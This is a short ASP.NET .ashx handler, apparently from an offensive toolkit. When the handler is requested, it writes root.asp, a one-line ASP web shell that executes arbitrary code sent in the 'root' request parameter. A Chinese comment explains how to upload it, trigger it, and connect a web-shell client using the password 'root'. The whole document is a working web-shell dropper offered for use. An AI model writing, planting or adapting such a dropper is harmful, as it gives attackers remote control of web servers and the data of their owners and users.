<%@ WebHandler Language="C#" class="Handler" %>

using System;
using System.Web;
using System.IO;
public class Handler : IHttpHandler {

public void ProcessRequest (HttpContext context) {
context.Response.ContentType = "text/plain";

StreamWriter file1= File.CreateText(context.Server.MapPath("root.asp"));
file1.Write("<%response.clear:execute request(\"root\"):response.End%>");
file1.Flush();
file1.Close();

}

public bool IsReusable {
get {
return false;
}
}

}
//访问上传后的ashx文件，就会在同目录下生成一个root.asp的一句话木马，然后使用一句话木马客户端连接，密码：root
